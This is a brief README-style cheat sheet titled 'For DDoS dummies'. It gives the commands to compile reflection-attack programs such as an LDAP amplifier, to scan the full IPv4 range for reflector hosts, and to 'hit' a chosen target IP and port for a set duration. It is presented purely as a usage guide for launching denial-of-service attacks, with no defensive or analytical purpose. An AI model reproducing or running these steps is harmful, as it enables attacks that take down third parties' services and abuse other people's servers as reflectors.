# For DDoS dummies
# Enjoy
# >Commands< 
gcc -o NAME NAME.C -pthread

EX - gcc -o ldap ldap.c -pthread
# >Scanning<
./name 1.1.1.1 255.255.255.255 name.txt 2 1ms

./ldapscan 1.1.1.1 255.255.255.255 ldap.txt 2 1ms

1.1.1.1 defines starting range; 255.255.255.255 defines end scan range; the name.txt is the reflection file you are scanning

the (2) is the amount of threads this process takes to run
# >Hit<

./name IP PORT name.txt 2 -1 TIME

EX ./ldap 1.1.1.1 80 ldap.txt 2 -1 500
# :) 
